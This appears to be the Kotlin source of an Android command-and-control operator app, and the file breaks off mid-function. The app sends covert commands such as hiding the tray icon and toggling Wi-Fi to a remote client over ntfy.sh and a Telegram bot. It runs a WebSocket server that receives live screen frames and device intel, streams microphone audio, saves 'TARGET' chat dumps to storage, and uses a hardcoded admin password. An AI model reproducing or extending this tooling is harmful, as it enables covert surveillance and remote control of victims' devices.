package com.c2c

import android.Manifest
import android.annotation.SuppressLint
import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.IBinder
import android.provider.Settings
import android.view.ViewGroup
import android.webkit.WebView
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.biometric.BiometricManager
import androidx.biometric.BiometricPrompt
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.ExperimentalFoundationApi
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.combinedClickable
import androidx.compose.foundation.gestures.detectDragGestures
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.pager.HorizontalPager
import androidx.compose.foundation.pager.rememberPagerState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.CutCornerShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.Font
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.unit.IntOffset
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.fragment.app.FragmentActivity
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.compose.*
import coil.compose.AsyncImage
import com.c2c.ui.theme.*
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.request.get
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.server.application.*
import io.ktor.server.engine.ApplicationEngine
import io.ktor.server.engine.embeddedServer
import io.ktor.server.routing.routing
import io.ktor.server.websocket.*
import io.ktor.websocket.*
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CopyOnWriteArrayList
import kotlin.math.roundToInt

val CyberFont = FontFamily(Font(R.font.jetbrains_mono, FontWeight.Normal))
val UbuntuInputFont = FontFamily(Font(R.font.ubuntu_regular, FontWeight.Normal))

data class PushMessage(val id: Int, val label: String, val cmd: String, var defaultArg: String = "", val requiresArg: Boolean = false, var iconUri: String? = null)
data class LiveApp(val name: String, val packageName: String, val iconUri: String? = null)
data class TelegramMsg(val id: Long, val text: String, val isMe: Boolean, val timestamp: Long, val photoId: String? = null, var downloadedPath: String? = null)

object ServerCore {
    var ktorServer: ApplicationEngine? = null
    // Changed to Thread-Safe List to prevent overwritten sessions
    val liveSessions = CopyOnWriteArrayList<WebSocketServerSession>()
    val logsFlow = MutableSharedFlow<String>(replay = 50)
    val streamFlow = MutableSharedFlow<ByteArray>(replay = 5)
    var isRunning = false
    var lastStatusSlab = "WAITING FOR CONNECTION..."

    fun log(msg: String, isSuccess: Boolean? = null) {
        logsFlow.tryEmit("> $msg")
        if (isSuccess == true) lastStatusSlab = "SUCCESS: $msg"
        else if (isSuccess == false) lastStatusSlab = "FAILURE: $msg"
    }
}

class C2ServerService : Service() {
    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("c2c_server", "C2C WebSocket Server", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val port = intent?.getIntExtra("port", 8765) ?: 8765
        val notification = NotificationCompat.Builder(this, "c2c_server")
            .setContentTitle("C2C Node Active")
            .setContentText("WebSocket Server running on port $port")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else startForeground(1, notification)
        startKtor(port)
        return START_STICKY
    }
    private fun startKtor(port: Int) {
        if (ServerCore.isRunning) return
        try {
            ServerCore.ktorServer = embeddedServer(io.ktor.server.cio.CIO, port = port, host = "0.0.0.0") {
                install(WebSockets)
                routing {
                    webSocket("/live") {
                        ServerCore.liveSessions.add(this)
                        ServerCore.log("CLIENT CONNECTED: ${call.request.local.remoteHost}", true)
                        try {
                            for (frame in incoming) {
                                when (frame) {
                                    is Frame.Text -> {
                                        val txt = frame.readText()
                                        ServerCore.log("RECV_JSON: $txt")
                                    }
                                    is Frame.Binary -> ServerCore.streamFlow.emit(frame.readBytes())
                                    else -> {}
                                }
                            }
                        } finally {
                            ServerCore.liveSessions.remove(this)
                            ServerCore.log("CLIENT DISCONNECTED", false)
                        }
                    }
                }
            }.start(wait = false)
            ServerCore.isRunning = true
            ServerCore.log("WEBSOCKET SERVER STARTED ON 0.0.0.0:$port", true)
        } catch (e: Exception) { ServerCore.log("SERVER CRASH: ${e.message}", false) }
    }
    override fun onDestroy() {
        ServerCore.ktorServer?.stop(1000, 2000)
        ServerCore.isRunning = false
        ServerCore.liveSessions.clear()
        ServerCore.log("SERVER TERMINATED.", false)
        super.onDestroy()
    }
    override fun onBind(intent: Intent?): IBinder? = null
}

class CyberViewModel(application: Application) : AndroidViewModel(application) {
    private val prefs = application.getSharedPreferences("CyberConfig", Context.MODE_PRIVATE)

    var serverUrl by mutableStateOf(prefs.getString("serverUrl", "https://ntfy.sh") ?: "https://ntfy.sh")
    var topic by mutableStateOf(prefs.getString("topic", "sys_linker_initial_comm_channel_xyz789") ?: "sys_linker_initial_comm_channel_xyz789")
    var pushMessages = mutableStateListOf<PushMessage>()
    var liveAppsList = mutableStateListOf<LiveApp>()

    var localServerPort by mutableStateOf("8765")
    var isServerRunning by mutableStateOf(ServerCore.isRunning)
    var serverLogs = mutableStateListOf<String>()
    var latestSlabTxt by mutableStateOf(ServerCore.lastStatusSlab)

    var isMicRunning by mutableStateOf(false)
    private val audioChannel = Channel<ByteArray>(Channel.UNLIMITED)

    var liveScreenJsonData by mutableStateOf("")
    var liveScreenFrame by mutableStateOf<ByteArray?>(null)

    var showAdvancedInfoModal by mutableStateOf(false)
    var advancedInfoData by mutableStateOf(JSONObject())
    var showScanResultsModal by mutableStateOf(false)
    var scanResults by mutableStateOf<List<Pair<String, String>>>(emptyList())
    var currentScanType by mutableStateOf("")

    var tgToken by mutableStateOf(prefs.getString("tgToken", "") ?: "")
    var tgChatId by mutableStateOf(prefs.getString("tgChatId", "") ?: "")
    var isTgLoggedIn by mutableStateOf(tgToken.isNotBlank() && tgChatId.isNotBlank())
    var isTgPollingActive by mutableStateOf(prefs.getBoolean("tgPollingActive", true))
    var tgPollingDelay by mutableStateOf(prefs.getLong("tgPollingDelay", 2000L))
    private var pollingJob: Job? = null
    var tgMessages = mutableStateListOf<TelegramMsg>()
    private var tgOffset = 0L

    val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }

    init {
        loadMessages()
        viewModelScope.launch(Dispatchers.Main) {
            ServerCore.logsFlow.collect { log ->
                if (serverLogs.size > 200) serverLogs.removeAt(0)
                serverLogs.add(log)
                latestSlabTxt = ServerCore.lastStatusSlab
                
                if (log.contains("RECV_JSON:") && log.contains("\"type\":\"live_screen\"")) {
                    try {
                        val jsonStr = log.substringAfter("RECV_JSON: ")
                        val data = JSONObject(jsonStr).getJSONObject("data").toString(4)
                        liveScreenJsonData = data
                        dumpScreenJson(data)
                    } catch(e:Exception){}
                }
                
                if (log.contains("RECV_JSON:") && log.contains("\"type\":\"scan_results\"")) {
                    try {
                        val jsonStr = log.substringAfter("RECV_JSON: ")
                        val data = JSONObject(jsonStr)
                        val resultsArray = data.getJSONArray("data")
                        val parsedResults = mutableListOf<Pair<String, String>>()
                        for (i in 0 until resultsArray.length()) {
                            val item = resultsArray.getJSONObject(i)
                            parsedResults.add(Pair(item.getString("name"), item.getString("details")))
                        }
                        scanResults = parsedResults
                        currentScanType = data.optString("scan_type", "NETWORK")
                        showScanResultsModal = true
                    } catch(e: Exception){
                        ServerCore.log("ERROR: Failed to parse scan results", false)
                    }
                }
            }
        }
        
        viewModelScope.launch(Dispatchers.IO) {
            ServerCore.streamFlow.collect { bytes ->
                if (bytes.firstOrNull()?.toInt() == 0x03) liveScreenFrame = bytes.copyOfRange(1, bytes.size)
            }
        }
        
        // Background Audio Broadcaster
        viewModelScope.launch(Dispatchers.IO) {
            for (chunk in audioChannel) {
                ServerCore.liveSessions.forEach { 
                    try { it.send(Frame.Binary(true, chunk)) } catch (e: Exception) {}
                }
            }
        }

        if (isTgLoggedIn) startTelegramPolling()
    }

    private fun dumpScreenJson(data: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val dir = File(Environment.getExternalStorageDirectory(), "c2c_dumps")
                if (!dir.exists()) dir.mkdirs()
                File(dir, "screen_ui_${System.currentTimeMillis()}.json").writeText(data)
            } catch (e: Exception){}
        }
    }

    fun saveConfig(newUrl: String, newTopic: String) {
        serverUrl = newUrl; topic = newTopic
        prefs.edit().putString("serverUrl", serverUrl).putString("topic", topic).apply()
        ServerCore.log("SYS: Config Saved", true)
    }

    fun saveNewCommand(label: String, cmd: String, defaultArg: String, requiresArg: Boolean) {
        pushMessages.add(PushMessage(System.currentTimeMillis().toInt(), label, cmd, defaultArg, requiresArg))
        persistMessages()
    }
    
    fun updateCommandIcon(id: Int, uri: String) {
        val i = pushMessages.indexOfFirst { it.id == id }
        if (i != -1) { pushMessages[i] = pushMessages[i].copy(iconUri = uri); persistMessages() }
    }

    private fun persistMessages() {
        val array = JSONArray()
        pushMessages.forEach { m -> array.put(JSONObject().put("id", m.id).put("label", m.label).put("cmd", m.cmd).put("arg", m.defaultArg).put("requiresArg", m.requiresArg).put("iconUri", m.iconUri ?: "")) }
        prefs.edit().putString("messages", array.toString()).apply()
    }
    
    private fun loadMessages() {
        val data = prefs.getString("messages", null)
        if (data != null) {
            try {
                val array = JSONArray(data)
                for (i in 0 until array.length()) {
                    val o = array.getJSONObject(i)
                    pushMessages.add(PushMessage(o.getInt("id"), o.getString("label"), o.getString("cmd"), o.optString("arg", ""), o.getBoolean("requiresArg"), o.optString("iconUri", "").takeIf { it.isNotBlank() }))
                }
            } catch (e: Exception) {}
        } else {
            saveNewCommand("Wake", "live_start", "", true)
            saveNewCommand("Change Name", "change_name", "", true)
            saveNewCommand("WIFI On/Off", "wifi_toggle", "", false)
            saveNewCommand("BT On/Off", "bt_toggle", "", false)
            saveNewCommand("WIFI Scan", "wifi_scan", "", false)
            saveNewCommand("Hide Tray", "hide_icon", "", false)
            saveNewCommand("Show Tray", "show_icon", "", false)
        }
    }
    
    fun addLiveApp(name: String, pkg: String, uri: String?) { liveAppsList.add(LiveApp(name, pkg, uri)) }

    // FIXED: Now uses viewModelScope so UI can be destroyed without killing network
    fun executePush(cmd: String, arg: String = "") {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val safeCmd = cmd.replace("\"", "\\\"")
                val payload = if (arg.isNotBlank()) """{"cmd": "$safeCmd", "arg": "${arg.replace("\"", "\\\"")}"}""" else """{"cmd": "$safeCmd"}"""
                val targetUrl = if (serverUrl.startsWith("http")) "${serverUrl.trimEnd('/')}/$topic" else "https://$serverUrl/${topic.trimEnd('/')}"
                httpClient.post(targetUrl) { setBody(payload) }
                ServerCore.log("PUSH SUCCESS: $payload", true)
            } catch (e: Exception) { 
                ServerCore.log("PUSH ERROR: ${e.message}", false) 
            }
        }
    }

    fun toggleServer(context: Context) {
        val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", localServerPort.toIntOrNull() ?: 8765) }
        if (ServerCore.isRunning) { context.stopService(intent); isServerRunning = false } 
        else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent); isServerRunning = true }
    }

    fun sendLive(cmd: String, arg: String = "") {
        viewModelScope.launch(Dispatchers.IO) {
            if (ServerCore.liveSessions.isNotEmpty()) {
                val json = if(arg.isNotBlank()) """{"cmd":"$cmd","arg":"$arg"}""" else """{"cmd":"$cmd"}"""
                ServerCore.liveSessions.forEach { 
                    try { it.send(Frame.Text(json)) } catch(e: Exception){} 
                }
                ServerCore.log("SENT_CMD: $json", true)
            } else ServerCore.log("ERROR: Client Offline", false)
        }
    }

    fun loginTelegram(token: String, chatId: String) {
        tgToken = token; tgChatId = chatId; isTgLoggedIn = true; isTgPollingActive = true
        prefs.edit().putString("tgToken", token).putString("tgChatId", chatId).putBoolean("tgPollingActive", true).apply()
        startTelegramPolling()
    }
    fun logoutTelegram() {
        isTgLoggedIn = false; isTgPollingActive = false; tgToken = ""; tgChatId = ""; tgMessages.clear(); pollingJob?.cancel()
        prefs.edit().remove("tgToken").remove("tgChatId").putBoolean("tgPollingActive", false).apply()
    }
    fun togglePolling() {
        isTgPollingActive = !isTgPollingActive
        prefs.edit().putBoolean("tgPollingActive", isTgPollingActive).apply()
        if (isTgPollingActive) startTelegramPolling() else pollingJob?.cancel()
    }
    fun setPollingSpeed(delayMs: Long) {
        tgPollingDelay = delayMs; prefs.edit().putLong("tgPollingDelay", delayMs).apply()
        if (isTgPollingActive) startTelegramPolling()
    }

    fun dumpChats() {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val dir = File(Environment.getExternalStorageDirectory(), "c2c_dumps")
                if (!dir.exists()) dir.mkdirs()
                val dumpFile = File(dir, "chat_dump_${System.currentTimeMillis()}.txt")
                val sb = StringBuilder()
                tgMessages.forEach { msg ->
                    val sender = if (msg.isMe) "ME" else "TARGET"
                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(msg.timestamp))
                    sb.append("[$date] $sender: ${msg.text}\n")
                }
                dumpFile.writeText(sb.toString())
                ServerCore.log("Chats dumped to ${dumpFile.absolutePath}", true)
            } catch (e: Exception) { ServerCore.log("Dump failed: ${e.message}", false) }
        }
    }
    
    fun getTelegramFileUrl(fileId: String, onResult: (String) -> Unit) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$tgToken/getFile?file_id=$fileId"
                val res = JSONObject(httpClient.get(url).bodyAsText())
                if (res.getBoolean("ok")) {
                    val filePath = res.getJSONObject("result").getString("file_path")
                    val fullUrl = "https://api.telegram.org/file/bot$tgToken/$filePath"
                    withContext(Dispatchers.Main) { onResult(fullUrl) }
                }
            } catch (e: Exception) {}
        }
    }

    @SuppressLint("MissingPermission")
    fun startMic() {
        if (isMicRunning) return
        isMicRunning = true
        // FIXED: Used a single Coroutine and a Channel to prevent OOM Exception
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val sampleRate = 16000
                val channelConfig = AudioFormat.CHANNEL_IN_MONO
                val audioFormat = AudioFormat.ENCODING_PCM_16BIT
                val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
                val audioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, bufferSize)
                
                if (audioRecord.state != AudioRecord.STATE_INITIALIZED) { isMicRunning = false; return@launch }
                
                audioRecord.startRecording()
                val buffer = ByteArray(bufferSize)
                
                while (isMicRunning && isActive) {
                    val read = audioRecord.read(buffer, 0, buffer.size)
                    if (read > 0) audioChannel.trySend(buffer.copyOfRange(0, read))
                }
                audioRecord.stop(); audioRecord.release()
            } catch (e: Exception) {
                ServerCore.log("MIC ERROR: ${e.message}", false)
                isMicRunning = false
            }
        }
    }

    fun stopMic() { isMicRunning = false }

    // FIXED: Bulletproof Polling Loop with delay limits and exception catching
    private fun startTelegramPolling() {
        pollingJob?.cancel()
        if (!isTgPollingActive || !isTgLoggedIn) return
        
        pollingJob = viewModelScope.launch(Dispatchers.IO) {
            while (isActive && isTgLoggedIn && isTgPollingActive) {
                try {
                    val url = "https://api.telegram.org/bot$tgToken/getUpdates?offset=$tgOffset&timeout=10"
                    val response = httpClient.get(url).bodyAsText()
                    val json = JSONObject(response)
                    
                    if (json.getBoolean("ok")) {
                        val result = json.getJSONArray("result")
                        for (i in 0 until result.length()) {
                            val update = result.getJSONObject(i)
                            tgOffset = update.getLong("update_id") + 1
                            val msg = update.optJSONObject("message") ?: continue
                            val text = msg.optString("text", "")
                            val date = msg.optLong("date") * 1000
                            val fromId = msg.optJSONObject("from")?.optString("id")
                            var photoId: String? = null
                            if (msg.has("photo")) {
                                val photos = msg.getJSONArray("photo")
                                photoId = photos.getJSONObject(photos.length() - 1).getString("file_id")
                            }
                            if (text.isNotBlank() || photoId != null) {
                                withContext(Dispatchers.Main) {
                                    val isMe = fromId == tgChatId
                                    if (text.startsWith("{") && text.contains("\"device_info\"")) {
                                        try {
                                            advancedInfoData = JSONObject(text)
                                            showAdvancedInfoModal = true
                                            ServerCore.log("SYS_INFO Received & Parsed", true)
                                        } catch (e: Exception) { tgMessages.add(TelegramMsg(tgOffset, text, isMe, date, photoId)) }
                                    } else {
                                        tgMessages.add(TelegramMsg(tgOffset, text, isMe, date, photoId))
                                    }
                                }
                            }
                        }
                    }
                } catch (e: CancellationException) {
                    throw e // Respect cancellation
                } catch (e: Exception) {
                    ServerCore.log("TG_POLL_ERR: ${e.localizedMessage}", false)
                    delay(5000) // Network failure backoff
                }
                delay(tgPollingDelay.coerceAtLeast(2000L)) // Enforce minimum to stop thread exhaustion
            }
        }
    }

    fun sendTelegramMessage(text: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                httpClient.post("https://api.telegram.org/bot$tgToken/sendMessage") { setBody("""{"chat_id":"$tgChatId","text":"$text"}""") }
                withContext(Dispatchers.Main) { tgMessages.add(TelegramMsg(System.currentTimeMillis(), text, true, System.currentTimeMillis())) }
            } catch (e: Exception) {
                ServerCore.log("TG SEND ERR: ${e.message}", false)
            }
        }
    }
}

class MainActivity : FragmentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            AppTheme {
                Surface(modifier = Modifier.fillMaxSize().crtTerminalEffect(), color = MaterialTheme.colorScheme.background) {
                    CyberAppNavigation(this)
                }
            }
        }
    }
    
    fun promptBiometric(onSuccess: () -> Unit, onError: (String) -> Unit) {
        val promptInfo = BiometricPrompt.PromptInfo.Builder().setTitle("CYBERNETIC AUTH").setSubtitle("Passkey required")
            .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG or BiometricManager.Authenticators.DEVICE_CREDENTIAL).build()
        BiometricPrompt(this, ContextCompat.getMainExecutor(this), object : BiometricPrompt.AuthenticationCallback() {
            override fun onAuthenticationError(c: Int, e: CharSequence) { onError(e.toString()) }
            override fun onAuthenticationSucceeded(r: BiometricPrompt.AuthenticationResult) { onSuccess() }
        }).authenticate(promptInfo)
    }

    fun requestPermissionsAndStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:${packageName}")
                }
                startActivity(intent)
            }
        }
    }
}

// Reusable Terminal Button
@Composable
fun TerminalButton(text: String, color: Color = CyberNeonCyan, modifier: Modifier = Modifier, onClick: () -> Unit) {
    Button(
        onClick = onClick,
        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
        shape = CyberShapes.small,
        border = BorderStroke(1.dp, color),
        modifier = modifier.fillMaxWidth()
    ) {
        Text("[ $text ]", color = color, fontFamily = CyberFont, fontWeight = FontWeight.Bold)
    }
}

fun parseLogColor(log: String): AnnotatedString {
    return buildAnnotatedString {
        if (log.startsWith("> ")) {
            withStyle(SpanStyle(color = LogDarkGreen)) { append("> ") }
            val rest = log.substring(2)
            if (rest.contains("ERROR") || rest.contains("FAILURE") || rest.contains("CRASH") || rest.contains("DISCONNECTED") || rest.contains("ERR")) {
                withStyle(SpanStyle(color = LogMediumRed)) { append(rest) }
            } else {
                val colonIdx = rest.indexOf(":")
                if (colonIdx != -1) {
                    val prefix = rest.substring(0, colonIdx)
                    if (prefix.all { it.isUpperCase() || it == '_' || it.isWhitespace() }) {
                        withStyle(SpanStyle(color = LogBrightGreen)) { append(prefix) }
                        withStyle(SpanStyle(color = CyberNeonYellow)) { append(rest.substring(colonIdx)) }
                    } else append(rest)
                } else append(rest)
            }
        } else append(log)
    }
}

@Composable
fun CyberAppNavigation(activity: MainActivity) {
    val navController = rememberNavController()
    val viewModel: CyberViewModel = viewModel()
    
    val permLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
        activity.requestPermissionsAndStorage() // Trigger Android 11+ storage explicitly
    }
    
    NavHost(navController = navController, startDestination = "login") {
        composable("login") { 
            LoginScreen({ 
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    permLauncher.launch(arrayOf(Manifest.permission.RECORD_AUDIO, Manifest.permission.POST_NOTIFICATIONS))
                } else {
                    permLauncher.launch(arrayOf(Manifest.permission.RECORD_AUDIO))
                }
                navController.navigate("main") { popUpTo("login") { inclusive = true } } 
            }, activity) 
        }
        composable("main") { MainScreen(viewModel) }
    }
}

@Composable
fun LoginScreen(onLoginSuccess: () -> Unit, activity: MainActivity) {
    var username by remember { mutableStateOf("") }; var password by remember { mutableStateOf("") }
    Column(modifier = Modifier.fillMaxSize().padding(24.dp), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) {
        Icon(Icons.Default.Terminal, "Terminal", tint = CyberNeonCyan, modifier = Modifier.size(72.dp))
        Text("SYSTEM_LOGIN", fontSize = 32.sp, fontFamily = CyberFont, color = CyberNeonCyan, fontWeight = FontWeight.Bold)
        Spacer(modifier = Modifier.height(32.dp))
        OutlinedTextField(value = username, onValueChange = { username = it }, label = { Text("USER_ID", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth())
        OutlinedTextField(value = password, onValueChange = { password = it }, label = { Text("PASSKEY", fontFamily = UbuntuInputFont) }, visualTransformation = PasswordVisualTransformation(), keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password), modifier = Modifier.fillMaxWidth())
        Spacer(modifier = Modifier.height(24.dp))
        TerminalButton("MANUAL OVERRIDE", CyberNeonCyan) { if (username == "admin" && password == "pass226") onLoginSuccess() }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = { activity.promptBiometric({ onLoginSuccess() }, {}) }, modifier = Modifier.fillMaxWidth().height(56.dp), shape = CyberShapes.small, colors = ButtonDefaults.buttonColors(containerColor = CyberNeonPink, contentColor = CyberBlack)) { 
            Text("[ BIOMETRIC ACCESS ]", fontFamily = CyberFont, fontWeight = FontWeight.Bold) 
        }
    }
}

@Composable
fun MainScreen(viewModel: CyberViewModel) {
    var selectedTab by remember { mutableStateOf(0) }
    Scaffold(
        modifier = Modifier.crtTerminalEffect(),
        bottomBar = {
            NavigationBar(containerColor = CyberBlack, modifier = Modifier.border(1.dp, CyberDarkGray)) {
                NavigationBarItem(selected = selectedTab == 0, onClick = { selectedTab = 0 }, icon = { Icon(Icons.Default.Send, "Push") }, label = { Text("DIRECTIVES", fontFamily = CyberFont, fontSize = 10.sp) }, colors = NavigationBarItemDefaults.colors(selectedIconColor = CyberBlack, selectedTextColor = CyberNeonCyan, indicatorColor = CyberNeonCyan))
                NavigationBarItem(selected = selectedTab == 1, onClick = { selectedTab = 1 }, icon = { Icon(Icons.Default.Dns, "Server") }, label = { Text("C2_NODE", fontFamily = CyberFont, fontSize = 10.sp) }, colors = NavigationBarItemDefaults.colors(selectedIconColor = CyberBlack, selectedTextColor = CyberNeonYellow, indicatorColor = CyberNeonYellow))
                NavigationBarItem(selected = selectedTab == 2, onClick = { selectedTab = 2 }, icon = { Icon(Icons.Default.Chat, "Chat") }, label = { Text("SEC_COMMS", fontFamily = CyberFont, fontSize = 10.sp) }, colors = NavigationBarItemDefaults.colors(selectedIconColor = CyberBlack, selectedTextColor = Color.White, indicatorColor = Color.White))
                NavigationBarItem(selected = selectedTab == 3, onClick = { selectedTab = 3 }, icon = { Icon(Icons.Default.Settings, "Setup") }, label = { Text("SYS_CONF", fontFamily = CyberFont, fontSize = 10.sp) }, colors = NavigationBarItemDefaults.colors(selectedIconColor = CyberBlack, selectedTextColor = CyberNeonPink, indicatorColor = CyberNeonPink))
            }
        }
    ) { padding ->
        Box(modifier = Modifier.padding(padding).fillMaxSize().background(Color.Transparent)) {
            when (selectedTab) {
                0 -> DirectivesTab(viewModel)
                1 -> ServerTab(viewModel)
                2 -> TelegramTab(viewModel)
                3 -> SetupTab(viewModel)
            }
        }
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun DirectivesTab(viewModel: CyberViewModel) {
    val context = LocalContext.current
    var volLevel by remember { mutableFloatStateOf(50f) }
    var showLocDialog by remember { mutableStateOf(false) }
    
    var curIconMsgId by remember { mutableIntStateOf(-1) }
    var showArgPrompt by remember { mutableStateOf<PushMessage?>(null) }
    var runtimeArg by remember { mutableStateOf("") }

    val photoPicker = rememberLauncherForActivityResult(ActivityResultContracts.PickVisualMedia()) { uri ->
        if (uri != null) viewModel.updateCommandIcon(curIconMsgId, uri.toString())
    }

    if (showArgPrompt != null) {
        AlertDialog(
            onDismissRequest = { showArgPrompt = null },
            containerColor = CyberBlack,
            title = { Text("[ INPUT REQUIRED ]", color = CyberNeonPink, fontFamily = CyberFont) },
            text = {
                OutlinedTextField(
                    value = runtimeArg, 
                    onValueChange = { runtimeArg = it },
                    label = { Text("Arg for: ${showArgPrompt?.label}", color = CyberNeonCyan) }
                )
            },
            confirmButton = {
                TerminalButton("EXECUTE", CyberNeonPink) {
                    viewModel.executePush(showArgPrompt!!.cmd, runtimeArg)
                    showArgPrompt = null; runtimeArg = ""
                }
            }
        )
    }

    // Reuse info modales from earlier code
    if (viewModel.showAdvancedInfoModal) {
        Dialog(onDismissRequest = { viewModel.showAdvancedInfoModal = false }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
            Card(modifier = Modifier.fillMaxWidth(0.95f).fillMaxHeight(0.9f), colors = CardDefaults.cardColors(containerColor = CyberBlack), border = BorderStroke(1.dp, CyberNeonCyan)) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("ADVANCED SYSTEM INTEL", color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 20.sp)
                    Spacer(modifier = Modifier.height(8.dp))
                    LazyColumn(modifier = Modifier.weight(1f)) {
                        val keys = viewModel.advancedInfoData.keys()
                        while (keys.hasNext()) {
                            val key = keys.next()
                            val value = viewModel.advancedInfoData.optString(key)
                            item {
                                Column(modifier = Modifier.padding(vertical = 4.dp).border(1.dp, CyberDarkGray, CyberShapes.small).padding(8.dp).fillMaxWidth()) {
                                    Text(key.uppercase(), color = CyberNeonYellow, fontFamily = CyberFont, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                    Text(value, color = CyberWhite, fontFamily = UbuntuInputFont, fontSize = 14.sp)
                                }
                            }
                        }
                    }
                    TerminalButton("CLOSE INTEL", CyberNeonPink) { viewModel.showAdvancedInfoModal = false }
                }
            }
        }
    }

    if (showLocDialog) {
        Dialog(onDismissRequest = { showLocDialog = false }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
            Card(modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.8f), colors = CardDefaults.cardColors(containerColor = CyberDarkGray), border = BorderStroke(1.dp, Color.Green)) {
                Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
                    Text("DEVICE_LOCATION_STREAM", color = Color.Green, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 20.sp)
                    Spacer(modifier = Modifier.height(16.dp))
